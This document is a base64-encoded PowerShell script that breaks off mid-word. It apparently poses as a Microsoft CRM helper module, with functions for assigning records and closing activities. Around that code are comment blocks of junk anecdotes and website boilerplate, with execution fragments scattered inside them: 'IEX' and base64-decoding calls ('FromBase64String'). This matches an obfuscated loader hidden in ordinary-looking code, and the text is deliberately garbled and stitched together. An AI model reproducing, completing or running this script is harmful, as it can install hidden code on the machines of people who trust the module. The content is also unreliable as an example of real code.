ZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGIoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBlKCkgc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gaCgpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBnKCkgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBiKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIGl7CgogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBBUkFNKAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtU2VydmljZUNsaWVudF0kY29ubiwgICAgICAgIAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJDcm1SZWNvcmQiLCBWYWx1ZUZyb21QaXBlbGluZT0kdHJ1ZSldCiAgICAgICAgW1BTT2JqZWN0XSRDcm1SZWNvcmQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9Ik5hbWVXaXRoSWQiKV0KICAgICAgICBbc3RyaW5nXSRFbnRpdHlMb2dpY2FsTmFtZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MiwgUGFyYW1ldGVyU2V0TmFtZT0iTmFtZVdpdGhJZCIpXQogICAgICAgIFtndWlkXSRJZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MyldW2FsaWFzKCJVc2VySWQiKV0KICAgICAgICBbZ3VpZF0kUHJpbmNpcGFsSWQsCgkJW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQb3NpdGlvbj00KV0KCQlbc3dpdGNoXSRBc3NpZ25Ub1RlYW0KICAgICkKICAgIGJlZ2luCiAgICB7CiAgICAgICAgJGNvbm4gPSBWZXJpZnlDcm1Db25uZWN0aW9uUGFyYW0gLWNvbm4gJGNvbm4gLXBpcGVsaW5lVmFsdWUgKCRQU0JvdW5kUGFyYW1ldGVycy5Db250YWluc0tleSgnY29ubicpKQogICAgfSAgICAgCglwcm9jZXNzCgl7CgkJaWYoJENybVJlY29yZCAtbmUgJG51bGwpCgkJewoJCSAgICAkRW50aXR5TG9naWNhbE5hbWUgPSAkQ3JtUmVjb3JkLmxvZ2ljYWxuYW1lCgkJICAgICRJZCA9ICRDcm1SZWNvcmQuKCRFbnRpdHlMb2dpY2FsTmFtZSArICJpZCIpCgkJfQoJCXRyeQoJCXsJCQkKCQkJIyBBcyBDcm1DbGllbnRTZXJ2aWNlIGRvZXMgbm90IGhhdmUgbWV0aG9kIHRvIGFzc2lnbiB0byB0ZWFtLCB1c2UgT3JnYW5pemF0aW9uIFJlcXVlc3QKCQkJaWYoJEFzc2lnblRvVGVhbSl7CgkJCQl3cml0ZS12ZXJib3NlICJBc3NpZ25pbmcgcmVjb3JkIHdpdGggSWQ6ICRJZCB0byBUZWFtIHdpdGggSWQ6ICRQcmluY2lwYWxJZCIKCQkJCQoJCQkJJHJlcSA9IE5ldy1PYmplY3QgTWljcm9zb2Z0LkNybS5TZGsuTWVzc2FnZXMuQXNzaWduUmVxdWVzdAoJCQkJJHJlcS50YXJnZXQgPSBOZXctQ3JtRW50aXR5UmVmZXJlbmNlIC1FbnRpdHlMb2dpY2FsTmFtZSAkRW50aXR5TG9naWNhbE5hbWUgLUlkICRJZAoJCQkJJHJlcS5Bc3NpZ25lZSA9IE5ldy1Dcm1FbnRpdHlSZWZlcmVuY2UgLUVudGl0eUxvZ2ljYWxOYW1lICJ0ZWFtIiAtSWQgJFByaW5jaXBhbElkCgkJCQkkcmVzdWx0ID0gW01pY3Jvc29mdC5Dcm0uU2RrLk1lc3NhZ2VzLkFzc2lnblJlc3BvbnNlXSRjb25uLkV4ZWN1dGVDcm1Pcmdhbml6YXRpb25SZXF1ZXN0KCRyZXEsICRudWxsKQoJCQkJIyBJZiBubyByZXN1bHQgcmV0dXJlbmQsIHRoZW4gaXQgaGFkIGFuIGlzc3VlLgoJCQkJaWYoJHJlc3VsdCAtZXEgJG51bGwpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRmYWxzZQogICAgICAgICAgICAgICAgfQoJCQl9CgkJCWVsc2V7CgkJICAgICAgICAkcmVzdWx0ID0gJGNvbm4uQXNzaWduRW50aXR5VG9Vc2VyKCRQcmluY2lwYWxJZCwgJEVudGl0eUxvZ2ljYWxOYW1lLCAkSWQsIFtHdWlkXTo6RW1wdHkpCgkJCX0JCQkKCQkJaWYoISRyZXN1bHQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICAgICAgICAgIH0KCgkJCXdyaXRlLXZlcmJvc2UgIkNvbXBsZXRlZC4uLiIKCQl9CgkJY2F0Y2gKCQl7CgkJICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCgkJfQoJfQp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBWb2NhYnVsYXJ5ClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIHZvY2FidWxhcnkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBiKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGIoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgZSgpIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGgoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgZygpIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiBqewoKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9IkNybVJlY29yZCIpXQogICAgICAgIFtQU09iamVjdF0kQ3JtUmVjb3JkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW3N0cmluZ10kQWN0aXZpdHlFbnRpdHlUeXBlLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0yLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW2d1aWRdJEFjdGl2aXR5SWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTMpXQogICAgICAgIFtzdHJpbmddJFN0YXRlQ29kZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249NCldCiAgICAgICAgW3N0cmluZ10kU3RhdHVzQ29kZQogICAgKQoJJGNvbm4gPSBWZXJpZnlDcm1Db25uZWN0aW9uUGFyYW0gLWNvbm4gJGNvbm4gLXBpcGVsaW5lVmFsdWUgKCRQU0JvdW5kUGFyYW1ldGVycy5Db250YWluc0tleSgnY29ubicpKSAgIAogICAgaWYoJENybVJlY29yZCAtbmUgJG51bGwpCiAgICB7CiAgICAgICAgJEFjdGl2aXR5RW50aXR5VHlwZSA9ICRDcm1SZWNvcmQubG9naWNhbG5hbWUKICAgICAgICAkQWN0aXZpdHlJZCA9ICRDcm1SZWNvcmQuKCJhY3Rpdml0eWlkIikKICAgIH0KICAgIHRyeQogICAgewogICAgICAgICRyZXN1bHQgPSAkY29ubi5DbG9zZUFjdGl2aXR5KCRBY3Rpdml0eUVudGl0eVR5cGUsICRBY3Rpdml0eUlkLCAkU3RhdGVDb2RlLCAkU3RhdHVzQ29kZSwgW0d1aWRdOjpFbXB0eSkKCQlpZighJHJlc3VsdCkKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICAgICAgfQogICAgfQogICAgY2F0Y2gKICAgIHsKICAgICAgICB0aHJvdyBMYXN0Q3JtQ29ubmVjdG9yRXhjZXB0aW9uKCRjb25uKQogICAgfQp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBWb2NhYnVsYXJ5ClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIHZvY2FidWxhc